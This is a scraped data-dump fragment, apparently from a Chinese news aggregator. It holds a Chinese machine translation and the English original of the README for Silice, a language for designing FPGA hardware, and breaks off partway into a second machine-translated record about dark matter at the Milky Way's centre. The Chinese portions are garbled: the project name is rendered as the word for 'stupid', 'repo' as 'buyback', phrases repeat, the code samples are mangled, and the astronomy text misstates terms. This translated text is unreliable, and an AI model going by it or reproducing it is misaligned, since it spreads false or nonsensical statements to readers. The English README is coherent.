Silien\u5e76\u4e0d\u65e8\u5728\u6210\u4e3a\u4e00\u4e2a\u9ad8\u6c34\u5e73\u7684\u5408\u6210\u8bed\u8a00\uff1a\u5b83\u4ecd\u7136\u9760\u8fd1\u786c\u4ef6\uff0c\u8ba9\u60a8\u5145\u5206\u5229\u7528FPGA\u67b6\u6784\uff0c\u5e76\u5bf9\u60a8\u7684\u8bbe\u8ba1\u5982\u4f55\u6620\u5c04\u5230\u786c\u4ef6\u7684\u7c92\u5ea6\u63a7\u5236\uff1a\u60a8\u4ecd\u7136\u63a7\u5236\u6bcf\u4e2a\u548c\u6bcf\u4e2a\u548c\u6bcf\u4e2a\u67b6\u6784\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\uff0c\u5177\u6709\u53ef\u9884\u6d4b\u7684\u6d41\u91cf\u63a7\u5236\u89c4\u5219\uff0c\u5982\u4f55\u4ee5\u53ca\u5f53\u6267\u884c\u72b6\u6001\u51fa\u73b0\u5982\u4f55\u4ee5\u53ca\u4f55\u65f6\uff0c\u5982\u4f55\u89e6\u53d1\u5668\u6620\u5c04\u5230\u53d8\u91cf\u4ee5\u53ca\u88ab\u6ce8\u518c\u7684\u5185\u5bb9\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5982\u679c\u4f60\u9009\u62e9\u4e86\u4f60\u53ef\u4ee5\u4ee5\u4e0eVerilog\u975e\u5e38\u76f8\u4f3c\u7684\u65b9\u5f0f\u8bbe\u8ba1\uff0c\u540c\u65f6\u4ecd\u7136\u53d7\u76ca\u4e8e\uff06\uff0334;\u751f\u6d3b\u8d28\u91cf\uff06\uff0334; SILICE\u8bed\u6cd5\u7684\u6539\u8fdb\u5141\u8bb8\u4ece\u6982\u5ff5\u4e2d\u4f18\u5316\u521d\u59cb\u539f\u578b\u6765\u5b9e\u73b0\u9ad8\u6548\u5b9e\u73b0.SILICE\u4e0eVerilog\u7f16\u8bd1\u548c\u4e92\u64cd\u4f5c\uff1a\u60a8\u53ef\u4ee5\u76f4\u63a5\u5b9e\u4f8b\u5316\u5e76\u4e0e\u73b0\u6709\u6a21\u5757\u7ed1\u5b9a\u3002\n \u8be5\u8bed\u8a00\u5177\u6709\u5b8c\u6574\u7684\u6784\u5efa\u7cfb\u7edf\uff0c\u8bb8\u591a\u793a\u4f8b\u548c\u57fa\u672c\u7ec4\u4ef6\uff08VGA\uff0cHDMI\uff0cOLED\uff0cUART\u548cSDRAM\u63a7\u5236\u5668\uff09\u3002\u6784\u5efa\u7cfb\u7edf\u5141\u8bb8\u8f7b\u677e\u5f00\u59cb\uff0c\u5e76\u4e14\u5df2\u7ecf\u652f\u6301\u8bb8\u591a\u70ed\u95e8\u7535\u8def\u677f\uff0c\u5982\u7834\u51b0\u8239\uff0cULX3S\uff0cFOMU\u548cICESTICK\u3002\n \u60a8\u4e0d\u9700\u8981\u4f7f\u7528FPGA\u6765\u5f00\u59cb\u4f7f\u7528SILIC\uff1a\u8bbe\u8ba1\u548c\u5b83\u4eec\u7684\u8f93\u51fa\uff08\u4f8b\u5982VGA\u4fe1\u53f7\uff09\u53ef\u4ee5\u6a21\u62df\u548c\u53ef\u89c6\u5316\u3002 Silice\u4e0e\u5f00\u6e90FGPA Toolchain\uff08Yosys / NextPNR / ICEStorm\uff09\u4e00\u8d77\u5de5\u4f5c\uff0c\u8bf7\u53c2\u9605ICE40\u548cECP5\u793a\u4f8b\u3002\n \u867d\u7136\u6211\u4e3a\u81ea\u5df1\u7684\u9700\u6c42\u5f00\u53d1\u4e86\u611a\u8822\uff0c\u4f46\u6211\u5e0c\u671b\u4f60\uff06\uff0339; ll\u627e\u5230\u5b83\u7684\u9879\u76ee\u5f88\u6709\u7528\uff01 \nSiliel\u4e0d\u62bd\u8c61\u786c\u4ef6\uff1a\u7a0b\u5e8f\u5458\u4ecd\u7136\u63a7\u5236\u5e76\u975e\u5e38\u63a5\u8fd1\u786c\u4ef6\u529f\u80fd\u3002\u5b83\u63d0\u4f9b\u4e86\u7b80\u5316\u8bbe\u8ba1\u548c\u91cd\u7528\uff08\u4fe1\u53f7\u7ec4\uff0c\u901a\u7528\u754c\u9762\uff0c\u6d41\u6c34\u7ebf\uff09\u7684\u53e5\u6cd5\u52a9\u624b\u3002 SILICE\u4e5f\u53ef\u4ee5\u5e2e\u52a9\u60a8\u5728\u6267\u884c\u6d41\u7a0b\u548c\u64cd\u4f5c\u5e8f\u5217\u65b9\u9762\u63a8\u7406\u3002\u4f46\u662f\uff0c\u8fd9\u4e0d\u662f\u5f3a\u5236\u6027\u7684\uff0c\u60a8\u4e5f\u53ef\u4ee5\u5b8c\u5168\u63a7\u5236\u5e76\u4f7f\u7528\u66f4\u76f4\u63a5\u7684\u786c\u4ef6\u8bbe\u8ba1\u98ce\u683c\u3002\u4f7f\u7528SILIES\u5f00\u53d1\u65f6\uff0c\u60a8\u53ef\u4ee5\u5c06\u4f18\u5316\u52aa\u529b\u96c6\u4e2d\u5728\u5173\u952e\u90e8\u4ef6\u4e0a\uff0c\u5e76\u5728\u8bbe\u8ba1\u7684\u5176\u4ed6\u90e8\u5206\u4f7f\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u3002\n  \u6e05\u6d01\uff0c\u7b80\u5355\u7684\u8bed\u6cd5\uff0c\u6e05\u695a\u5730\u66b4\u9732\u4e86\u8fd0\u8425\u6d41\u7a0b\u4ee5\u53ca\u6240\u82b1\u8d39\u7684\u65f6\u949f\u5468\u671f\u7684\u6d41\u7a0b\u3002\n   \u53ef\u9009\u7684\u6d41\u91cf\u63a7\u5236\u9762\u5411\u8bbe\u8ba1\u98ce\u683c\uff08\u81ea\u52a8FSM\u751f\u6210\uff09\uff0c\u81ea\u7136\u5730\u96c6\u6210\u5728\u8bbe\u8ba1\u4e2d\uff1a\u867d\u7136\uff0c\u65ad\u88c2\uff0c\u5b50\u7a0b\u5e8f\u3002\n  \u81ea\u52a8\u8003\u8651\u4e3a\u53d8\u91cf\u521b\u5efa\u89e6\u53d1\u5668\uff0c\u5177\u6709\u81ea\u52a8\u4fee\u526a\uff08\u4f8b\u5982const\u6216\u7ed1\u5b9a\uff09\u3002\n  Fire-V\u9879\u76ee\u662f\u4e00\u79cd\u5177\u6709RV32I\u5904\u7406\u5668\u7684\u56fe\u5f62RISCV\u6846\u67b6\uff0c\u4e3b\u8981\u4f9d\u8d56\u4e8e\u975e\u987a\u5e8f\u6784\u9020\u3002\n    1\u7b97\u6cd5\u4e3b\u8981\uff08\u8f93\u51faUINT8 LED\uff09{2 UINT28\u8ba1\u6570\u5668= 0; // A 28\u4f4d\u65e0\u7b26\u53f7\u6574\u65703 LED\uff1a=\u8ba1\u6570\u5668[20,8]; // LED\u4f7f\u75288\u4e2a\u6700\u9ad8\u6709\u6548\u4f4d4\u7684\u6bcf\u4e2a\u65f6\u949f\u66f4\u65b0\u4e86\uff081\uff09{// forever 5\u8ba1\u6570\u5668=\u8ba1\u6570\u5668+ 1; //\u589e\u91cf\u8ba1\u6570\u56686} 7}\n      \u7b2c1\u884c\u662f\u4efb\u4f55SILIES\u786c\u4ef6\u7684\u5165\u53e3\u70b9\uff1a\u4e3b\u8981\u7b97\u6cd5\u3002\u7b2c2\u884cWe Definea 28\u4f4d\u65e0\u7b26\u53f7int\uff0c\u521d\u59cb\u5316\u4e3a0.\u521d\u59cb\u5316\u5668\u662f\u5f3a\u5236\u6027\u7684\uff0c\u59cb\u7ec8\u662f\u5e38\u7528\u9879.Line 3\u6211\u4eec\u8bf7\u6c42\u8f93\u51faLED\u8ddf\u8e2a\u8ba1\u6570\u5668\u53d8\u91cf\u7684\u516b\u4e2a\u6700\u9ad8\u6709\u6548\u4f4d\u3002\u8bed\u6cd5[20,8]\u8868\u793a8\u4f4d\u4ece\u4f4d20\u5f00\u59cb\u3002\u5206\u914d\u7ed9LEDUSES\uff1a=\u8fd0\u7b97\u7b26\u662f\u4e00\u4e2a\u59cb\u7ec8\u5206\u914d\uff1aLED\u73b0\u5728\u5728\u6bcf\u4e2a\u4e0a\u5347\u65f6\u949f\u540e\u7528\u8ba1\u6570\u5668\u81ea\u52a8\u5730\u81ea\u52a8\u5316\u3002\u8fd9\u6837\u7684\u5206\u914d\u5fc5\u987b\u5728\u4efb\u4f55\u5176\u4ed6\u6307\u4ee4\u4e4b\u524d\u51fa\u73b0\u7b97\u6cd5\u7684\u9876\u90e8\u3002 \n\u6700\u540e\uff0c\u7b2c4-6\u884c\u5b9a\u4e49\u4e86\u9012\u589e\u8ba1\u6570\u5668\u7684\u65e0\u9650\u5faa\u73af\u3002\u5f53\u7136\uff0c28\u4f4d\u8ba1\u6570\u5668\u6700\u7ec8\u5c06\u6ea2\u51fa\u5e76\u8fd4\u56de\u52300\uff0c\u56e0\u6b64\u5faa\u73afLED\u706f\u6a21\u5f0f\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5faa\u73af\u91c7\u53d6\u6070\u597d\u4e00\u4e2a\u5faa\u73af\u6267\u884c\uff1a\u6211\u4eec\u6bcf\u6b21\u6fc0\u52b1\u4e3a50 MHz\uff08Mojo v3\u7684\u65f6\u949f\u9891\u7387\uff09\u7684\u4e00\u4e2a\u589e\u91cf\uff09\u3002\n \u7136\u540e\u6211\u4eec\u7528siliice\u7f16\u5199\u3002 -f\u53c2\u6570\u8868\u793a\u8981\u4f7f\u7528\u7684\u6846\u67b6\uff1a\u8fd9\u662fANFPGA Plateform\u76f8\u5173\u5305\u88c5\u4ee3\u7801\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u4ec5\u4f7f\u7528Mojo\u6846\u67b6\u4e0eLED\u3002\u63d0\u4f9b\u5176\u4ed6\u6846\u67b6\uff0c\u5f88\u5bb9\u6613\u5199\u81ea\u5df1\u3002\n -O\u53c2\u6570\u6307\u793a\u7f16\u5199Verilog\u8f93\u51fa\u7684\u4f4d\u7f6e\u3002\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u8986\u76d6\u4e86\u9884\u5148\u5b58\u5728\u7684\u9879\u76ee\u7684\u4e3b\u6587\u4ef6\uff0c\u7136\u540e\u4f7f\u7528Xilinx ISE Toolchain\u7f16\u8bd1.Fear\u4e0d\u662f\uff0c\u6211\u4eec\u8fd8\u6709\u4e0eYosys\uff0cNextPNR\u548cProject Icestorm\u4e00\u8d77\u4f7f\u7528\u7684\u793a\u4f8b\uff01\n    1\u7b97\u6cd5main\uff08\uff09{2 brom int12 sintbl [4096] = {...} 3 ... 4\uff081\uff09{//\u6e32\u67d3\u5faa\u73af5 //\u83b7\u53d6cos / sin\u89c6\u56fe6 sintbl\u3002 Addr =\uff08VieeAngle\uff09\uff06amp; 4095; 7 ++\uff1a8 SINVIEW = SINTBL\u3002 rdata; 9 Sintbl\u3002 Addr =\uff08VieeAngle + 1024\uff09\uff06amp; 4095; 10 ++\uff1a11 cosview = sintbl\u3002 rdata; 12 ...\n  \u6b64\u4ee3\u7801\u5728\u5757ROM\u4e2d\u5b58\u50a8\u6b63\u5f26\u8868\uff0c\u5e76\u8bbf\u95ee\u5b83\u4ee5\u83b7\u53d6\u5f53\u524d\u89c6\u56fe\u89d2\u5ea6\u7684\u4f59\u5f26\u548c\u6b63\u5f26\u3002\u6ce8\u610f\uff1a++\uff1a\u6b65\u8fdb\u64cd\u4f5c\u5458\u5728\u7b2c7\u884c\u548c10\u4e2d\u3002\u8fd9\u660e\u786e\u5730\u5206\u5272\u4e86exectutuct\u6d41\u7a0b\u5e76\u4ecb\u7ecd\u4e00\u4e2a\u5faa\u73af\u5ef6\u8fdf\uff0c\u8fd9\u91cc\u7b49\u5f85BROM\u8f93\u51fa\u5176\u7ed3\u679c\u5728addr.anything\u4e2d\u7684Select\u5730\u5740\u7684\u5b57\u6bb5RDATA\u4e2d\u7684\u7ed3\u679c\u88ab\u8ba4\u4e3a\u662f\u7ec4\u5408;\u4f8b\u5982\uff0c\u5728\u786c\u4ef6\u4e0a\u5e76\u884c\u8bc4\u4f30\u7ebf8\u548c9\uff0c\u56e0\u4e3a\u5b83\u4eec\u4ea7\u751f\u4e24\u7247\u72ec\u7acb\u7535\u8def\u3002\n     \u8bf7\u53c2\u9605\u201c\u5165\u95e8\u6307\u5357\u201d\u3002\u611a\u8822\u5728Windows\uff0cLinux\u548cMacOS\u4e0a\u8fd0\u884c\u5f88\u597d\uff01\u8981\u5f00\u59cb\u7f16\u5199\u7f16\u5199\u4ee3\u7801\uff0c\u8bf7\u53c2\u9605\u7f16\u5199\u60a8\u7684\u7b2c\u4e00\u4e2a\u8bbe\u8ba1\u3002\u67e5\u770b\u53ef\u4ee5\u4f7f\u7528SILICE\u5b8c\u6210\u7684\u5185\u5bb9\uff0c\u7ed3\u5e10\u6211\u4eec\u7684\u793a\u4f8b\u9879\u76ee\uff08\u6240\u6709\u5728\u6b64\u56de\u8d2d\u4e2d\u63d0\u4f9b\uff09\u3002\n  siliel\u5df2\u7ecf\u7528\u4e8e\u4ece\u4e00\u4e2a\u5c0f\u578bRISC-V\u5904\u7406\u5668\u5230\u6574\u4e2a\u6e38\u620f\u6e32\u67d3\u5faa\u73af\uff08\u8bbf\u95ee\u793a\u4f8b\u9875\u9762\uff09\u7684\u975e\u7410\u788e\u7684\u8bbe\u8ba1\u3002 \n\u7136\u800c\uff0cSiliel\u6b63\u5728\u79ef\u6781\u53d1\u5c55\u3002 \u6211\u51b3\u5b9a\u6253\u5f00\u56de\u8d2d\uff0c\u6240\u4ee5\u6bcf\u4e2a\u4eba\u90fd\u53ef\u4ee5\u52a0\u5165\u4e50\u8da3\uff0c\u4f46\u5b83\u8fdc\u975e\u5b8c\u6574\uff1a\u6587\u4ef6\u7f3a\u4e4f\uff0c\u4e00\u4e9b\u4f8b\u5b50\u5df2\u7ecf\u8fc7\u65f6\u6216\u8fdc\u8fdc\u629b\u5149\uff0c\u4e00\u4e9b\u975e\u5e38\u91cd\u8981\u7684\u8bed\u8a00\u529f\u80fd\u4e22\u5931\uff0c\u5e76\u4e14\u5b58\u5728\u8bb8\u591a\u77e5\u540d\u95ee\u9898\uff08\u5934 \u5230\u95ee\u9898\u9875\u9762\uff09\u3002 \u6211\u6709\u4fe1\u5fc3\u6211\u53ef\u4ee5\u907f\u514d\u4e3b\u8981\u7684\u4ee3\u7801\u7834\u574f\u8bed\u6cd5\u53d8\u5316\uff0c\u4f46\u53ef\u80fd\u9700\u8981\u4e00\u4e9b\u8c03\u6574\u3002  \u6211\u5e0c\u671b\u4f60\uff06\uff0339;\u4ecd\u7136\u559c\u6b22\u6f5c\u5165\u5b83\uff0c\u5e76\u4f1a\u53d1\u73b0\u5b83\u5f88\u6709\u7528\u3002 \u8bf7\u544a\u8bc9\u6211\u60a8\u7684\u60f3\u6cd5\uff1a\u6b22\u8fce\u610f\u89c1\u548c\u6350\u6b3e\uff01  \u9879\u76ee\u5305\u542b\u8bb8\u591a\u6f14\u793a\u9879\u76ee\uff08\u53c2\u89c1\u5176\u4e2d\u7684\u81ea\u8ff0\u6587\u4ef6\uff09\u4ee5\u53ca\u4e3a\u51e0\u4e2a\u677f\u6784\u5efa\u811a\u672c  \u5de5\u5177\u5305\u542b\u5bf9SiliUs\u5f00\u53d1\u7684\u5de5\u5177\uff0c\u6e90\u6216\u4e8c\u8fdb\u5236\u8868\u5355\uff08\u8981\u5b89\u88c5\uff0c\u8bf7\u53c2\u9605\u5165\u95e8\uff09 ", "note_en": "To see what can be done with Silice, checkout the  example projects (all are available in this repo).\n  Important: Latest changes occur in the  wip (work in progress) and  draft branches, check it out to enjoy the latest features.  Read more about development branches.\n   Silice simplifies prototyping algorithms on FPGAs. It provides a comfortable yet thin abstraction above  Verilog (a typical hardware description language), simplifying design without loosing precise control over the hardware. It provides &#34;quality of life&#34; features to group signals, define generic interfaces and circuitries, instantiate block RAMs, describe pipelines, deal with multiple clock domains and automatically manage flip-flops.It gives the (optional) ability to write parts of your design as sequences of operations, subroutines that can be called, and to use control flow statements such as while and break, describing operations and algorithms that run in parallel and are precisely in sync.Silice detects combinatorial loops and many other error-prone cases, and features a Lua-preprocessor enabling advanced code generation.\n Silice does not aim to be a high level synthesis language: it  remains close to the hardware and lets you fully exploit FPGA architectures, with a fine grain control on how your design maps to the hardware: You remain in control of what happens at each and every clock cycle, with predictable rules for flow control, how and when execution states appear, how flip-flops map to variables, and what gets registered or not. In fact, if you chose so you can design in a way that is very similar to Verilog, while still benefiting from the &#34;quality of life&#34; improvements of Silice syntax.This allows to refine an initial prototype from concept to efficient implementation.Silice compiles to and inter-operates with Verilog: you can directly instantiate and bind with existing modules.\n The language comes with a complete build system,  many examples and  basic components (VGA, HDMI, OLED, UART, and SDRAM controllers). The build system allows to  get started easily, and already supports many  popular boards such as the IceBreaker, ULX3S, Fomu and IceStick.\n You do not need an FPGA to start with Silice: designs and their outputs (e.g. VGA signal) can be simulated and visualized. Silice works great with the open source FGPA toolchain (yosys/nextpnr/icestorm), see our  Ice40 and ECP5 examples.\n While I developed Silice for my own needs, I hope you&#39;ll find it useful for your projects!\n  Silice does not abstract away the hardware: the programmer remains in control and very close to hardware features. It provides syntactic helpers simplifying design and reuse (signal groups, generic interfaces, pipelining). Silice can also help you reason in terms of execution flow and operation sequences. However, this is not mandatory and you can also take full control and use a more direct hardware design style. When developing with Silice you can focus  optimization efforts on critical parts, and use a simpler approach in other parts of the design.\n  A clean, simple syntax that clearly exposes the flow of operations and where clock cycles are spent.\n   An optional flow-control oriented design style (automatic FSM generation), that naturally integrates within a design: while, break, subroutines.\n  Automatically takes care of creating flip-flops for variables, with automatic pruning (e.g. const or bindings).\n  The  fire-v project is a graphical RISCV framework with a  RV32I processor that relies mostly on non-sequential constructs.\n    1 algorithm  main(output uint8 led) {  2 uint28 counter =  0;   // a 28 bits unsigned integer 3 led := counter[ 20, 8];   // LEDs updated every clock with the 8 most significant bits  4  while ( 1) {   // forever 5 counter = counter +  1;   // increment counter 6 }  7 }\n      Line 1 is the entry point of any Silice hardware: the main algorithm. Line 2 we definea 28 bits unsigned int, initialized to 0. Initializers are mandatory and are always constants.Line 3 we request that the output led tracks the eight most significant bits of the counter variable.The syntax [20,8] means 8 bits wide starting from bit 20. The assignment to leduses the := operator which is an  always assignment: led is now automaticallyupdated with counter after each rising clock. Such assignments have to appearat the top of an algorithm, right before any other instruction.\n Finally, lines 4-6 define the infinite loop that increments the counter. Of course the28 bit counter will ultimately overflow and go back to 0, hence the cyclic LED light pattern.In this case, the loop takes exactly one cycle to execute: we have one increment per cycleat 50 MHz (the clock frequency of the Mojo v3).\n We then compile with silice. The -f parameter indicates which framework to use: this is anFPGA plateform dependent wrapper code. Here we are using the Mojo framework with LEDs only.Several other frameworks are provided, and it is easy to write your own.\n The -o parameter indicates where to write the Verilog output. In this example we overwritethe main file of a pre-existing project, which is then compiled using Xilinx ISE toolchain.Fear not, we also have examples working with yosys, nextpnr and  project icestorm!\n    1 algorithm  main() {  2 brom int12 sintbl[ 4096] = {...} 3 ... 4  while ( 1) {   // render loop 5   // get cos/sin view 6 sintbl. addr = (viewangle) &amp;  4095; 7 ++: 8 sinview = sintbl. rdata; 9 sintbl. addr = (viewangle +  1024) &amp;  4095; 10 ++: 11 cosview = sintbl. rdata; 12 ...\n  This code is storing a sine table in a block ROM and accesses it to obtain a cosine and sine for the current view angle.Note the use of the  ++:  step operator in lines 7 and 10. This explicitely splits the exectution flow and introduces a one cycle delay, here waiting for the brom to output its result in field  rdata for the select address in  addr.Anything in between is considered combinational; for instance lines 8 and 9 are evaluated in parallel on hardware, as theyeach produce two pieces of independent circuitry.\n     See the  getting started guide. Silice runs great on Windows, Linux, and macOS!To start writing code, see  writing your first design.To see what can be done with Silice, checkout our  example projects (all are available in this repo).\n  Silice can already be used to create non trivial designs, from a tiny Risc-V processor to an entire game render loop (visit the  examples page).\n However Silice is under active development. I decided to open the repo so everyone can join in the fun, but it is far from complete: documentation is lacking, some examples are outdated or far from polished, some very important language features are missing, and many known issues exist (head out to the  Issues page). I am confident I can avoid major code breaking syntax changes, but some adjustments may be necessary.\n I hope you&#39;ll nevertheless enjoy diving into it, and will find it useful. Please let me know your thoughts: comments and contributions are welcome!\n    projects contains many demo projects ( see README therein) as well as build scripts for several boards\n   tools contains tools useful for Silice development, either source or binary form (to be installed, see  getting started)", "posttime": "2021-06-22 18:20:13", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u786c\u4ef6,algorithms,language", "title": "SILICE\uff1a\u7528\u4e8e\u786c\u4ef6\u786c\u4ef6\u786c\u4ef6\u786c\u4ef6\u7684\u8bed\u8a00 ", "title_en": "Silice: A language for hardcoding Algorithms into FPGA hardware", "transed": 1, "url": "https://github.com/sylefeb/Silice", "via": "", "real_tags": ["\u786c\u4ef6", "language"]}, {"category": "", "categoryclass": "", "imagename": "77a5a34cb47ab9b101c09aaeb8540670.jpeg", "infoid": 1067400, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6839\u636e\u4e00\u9879\u65b0\u7684\u7814\u7a76\uff0c\u94f6\u6cb3\u7cfb\u7684\u4e2d\u5fc3\u53ef\u80fd\u662f\u6697\u7269\u800c\u4e0d\u662f\u8d85\u5927\u7684\u9ed1\u6d1e\u3002\n \u8be5\u7814\u7a76\u57fa\u4e8e\u5bf9\u6700\u63a5\u8fd1\u4e2d\u5fc3\u7684\u7269\u4f53\u7684\u89c2\u5bdf\u3002\n   \u5982\u679c\u6211\u4eec\u7684\u661f\u7cfb\u7684\u4e2d\u5fc3\u662f\u6bd5\u7adf\u4e0d\u662f\u8d85\u7ea7\u5206\u7c7b\u7684\u9ed1\u6d1e\uff0c\u800c\u662f\u5de8\u5927\u7684\u6697\u7269\u8d28\uff1f\u8fd9\u5c06\u4f7f\u6211\u4eec\u5bf9\u94f6\u6cb3\u7cfb\u7684\u957f\u671f\u7406\u89e3\uff0c\u4f46\u5728\u4e00\u9879\u65b0\u7684\u7814\u7a76\u4e2d\uff0c\u6765\u81ea\u610f\u5927\u5229\uff0c\u963f\u6839\u5ef7\u548c\u54e5\u4f26\u6bd4\u4e9a\u7684\u79d1\u5b66\u5bb6\u8868\u793a\u8bc1\u636e\u5806\u79ef\u8d77\u6765\u3002\n \u27a1\u4f60\u8ba4\u4e3a\u7a7a\u95f4\u662f\u574f\u4e8b\u3002\u6211\u4eec\u4e5f\u662f\u3002\u8ba9\u6211\u4eec\u4e00\u8d77\u63a2\u7d22\u5b83\u3002\n \u5728\u94f6\u6cb3\u7cfb\u4e2d\u5fc3\u7684\u8d85\u5927\u5206\u79bb\u7684\u9ed1\u6d1e\u7684\u60f3\u6cd5\u662f\u5b8c\u5168\u6210\u719f\u7684\uff0c\u90e8\u5206\u5730\u57fa\u4e8eS0-2\u7b49\u7279\u5b9a\u6052\u661f\u7684\u8f68\u9053\u3002\u79d1\u5b66\u5bb6\u4eec\u5728\u8f68\u9053\u4e2d\u7814\u7a76\u4e86\u8fd9\u4e9b\u7269\u4f53\uff0c\u4f5c\u4e3a\u63a8\u65ad\u4ed6\u4eec\u5b9e\u9645\u8f68\u9053\u7684\u4e1c\u897f - \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u201c\u8d85\u5927\u7684\u9ed1\u6d1e400\u4e07\u6b21\u592a\u9633\u7684\u9633\u5149\uff0c\u201dSciencealert\u89e3\u91ca\u9053\u3002\n \u8d85\u5927\u5206\u79bb\u7684\u9ed1\u6d1e\u79f0\u4e3a\u5c04\u624b\u5ea7a *\u3002 S0-2\u548c\u5176\u4ed6\u65e2\u5b9a\u7684\u6052\u661f\u5c06\u5728\u5c04\u624b\u5ea7A *\u5468\u56f4\u7684\u8f68\u9053\u4e0a\u62c9\u52a8\uff0c\u8fdb\u5165\u79d1\u5b66\u5bb6\u8861\u91cf\u7684\u6781\u7aef\u8f68\u9053\uff0c\u4ee5\u4fbf\u4e86\u89e3\u8d85\u73b0\u5b9e\u7684\u9ed1\u6d1e\u6240\u5728\u7684\u5185\u5bb9\u3002\u60f3\u60f3\u80a5\u7682\u82cf\u65af\u5982\u4f55\u8868\u73b0\u5982\u4f55\uff0c\u56e0\u4e3a\u6c34\u873f\u8712\u5230\u4f60\u7684\u6d41\u5931\uff0c\u8fd9\u544a\u8bc9\u4f60\u6d41\u5931\u6240\u505a\u7684\u4e8b\u60c5\u3002\u5373\u4f7f\u4f60\u65e0\u6cd5\u76f4\u63a5\u770b\u5230\u6392\u6c34\u6c9f\uff0c\u5b83\u5468\u56f4\u7684\u884c\u4e3a\u4e5f\u4f1a\u7ed9\u4f60\u7ebf\u7d22\u3002\n  \u79d1\u5b66\u5bb6\u4eec\u4ecd\u5728\u8fdb\u884c\u90a3\u79cd\u7814\u7a76\uff0c\u4f46\u662f\u4e00\u4e2a\u65b0\u7684\u7a7a\u95f4\u7269\u4f53\u9010\u6e10\u6d8c\u73b0\u5728\u9ed1\u6d1e\u7406\u8bba\u4e0a\u3002\u8fd9\u4e9b\u7269\u4f53\u201c\u770b\u8d77\u6765\u50cf\u5929\u7136\u6c14\uff0c\u50cf\u661f\u661f\u4e00\u6837\uff0c\u201d\u7269\u7406\u5b66\u5bb6\u5b89\u5fb7\u91cc\u4e9a\u683c\u5179\u57282020\u5e74\u544a\u8bc9\u79d1\u897f\u4f26\u7279\u3002\u8fd9\u7c7b\u7269\u8d28\u6709\u516d\u4e2a\u201cG\u201d\u5bf9\u8c61\uff0c\u8f68\u9053\u4ece170\u52301,600\u5e74\u3002 \n\u6700\u8fd1\uff0c\u4ed6\u4eec\u7684\u4e0d\u826f\u8f68\u9053\u5bfc\u81f4\u4e86\u4e00\u4e2a\u65b0\u7684\u7ade\u4e89\u7406\u8bba\u6765\u63cf\u8ff0\u94f6\u6cb3\u7cfb\u7684\u4e2d\u5fc3\u3002\n 2014\u5e74\uff0c\u79d1\u5b66\u5bb6\u89c2\u5bdf\u5230\u5bf9\u8c61G2\u5c06\u5176\u6700\u63a5\u8fd1\u7684\u5149\u70b9\u4f20\u9012\u7ed9\u5c04\u624b\u5ea7A *\u5e76\u5ef6\u4f38\u51fa\u6765\u5e76\u626d\u66f2 - \u4e00\u79cd\u79f0\u4e3a\u963b\u529b\u7684\u73b0\u8c61\u3002\u8fd9\u662f\u610f\u5927\u5229\u7684\u56fd\u9645\u76f8\u5bf9\u8bba\u5929\u4f53\u7269\u7406\u5b66\u4e2d\u5fc3\u7684\u79d1\u5b66\u5bb6\uff0c\u662f\u4e00\u4e2a\u6807\u5fd7\uff0cSagittarius A *\u53ef\u80fd\u662f\u9664\u4e86\u8d85\u7ea7\u5206\u7c7b\u7684\u9ed1\u6d1e\u4e4b\u5916\u7684\u4e1c\u897f\u3002\n  \u57282020\u5e74\uff0c\u540c\u4e00\u7814\u7a76\u56e2\u961f\u53d1\u8868\u4e86G2\u548cS2\u53ef\u80fd\u4f1a\u5728\u5c04\u624b\u5ea7A *\u9644\u8fd1\u7ecf\u5386\u540c\u6837\u4e0d\u540c\u7684\u5f15\u529b\u62c9\u3002\u4ed6\u4eec\u8bf4\uff0c\u8fd9\u4e9b\u7269\u4f53\u8868\u73b0\u7684\u65b9\u5f0f\u4e0e\u7279\u5b9a\u7c7b\u578b\u7684\u6697\u7269\u8d28\u66f4\u52a0\u4e00\u81f4\uff0c\u5728\u5b83\u4eec\u5bf9\u9ed1\u6d1e\u7684\u5e76\u6392\u5206\u6790\u4e0e\u6697\u7269\u8d28\u4e2d\u7684\u89e3\u91ca\u4e2d\uff0c\u6697\u7269\u8d28\u662f\u66f4\u597d\u7684\u7edf\u8ba1\u5951\u5408\u3002\n  \u6697\u7269\u8d28\u662f\u6211\u4eec\u770b\u4e0d\u5230\u7684\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b83\u5bf9\u5b83\u5468\u56f4\u7684\u91cd\u529b\u548c\u7269\u4f53\u7684\u5f71\u54cd\u6765\u8861\u91cf\u5b83\u3002\u6697\u7269\u8d28\u5360\u6211\u4eec\u5b87\u5b99\u8d28\u91cf\u768430\uff05\uff0c\u4f46\u5b83\u662f\u770b\u4e0d\u89c1\u7684\uff0c\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6ca1\u6709\u76f4\u63a5\u89c2\u5bdf\u5230\u3002\u4f46\u5b83\u7684\u5b58\u5728\u4ee5\u53ca\u6697\u80fd\u7684\u76f8\u5173\u89c2\u5ff5\uff0c\u5360\u7f8e\u56fd\u5468\u56f4\u7684\u5b87\u5b99\u8d28\u91cf\u768499.5\uff05\uff0c\u5e76\u4e3a\u7269\u7406\u548c\u5b87\u5b99\u5b66\u4e2d\u7684\u4e00\u5927\u95ee\u9898\u63d0\u4f9b\u4e86\u7f3a\u5931\u7684\u4f5c\u54c1\u3002\n \u6697\u7269\u8d28\u53ef\u4ee5\u5e76\u786e\u5b9e\u53d8\u6210\u9ed1\u6d1e\uff0c\u4f46\u79d1\u5b66\u5bb6\u4eec\u6307\u51fa\uff0c\u5c04\u624b\u5ea7a 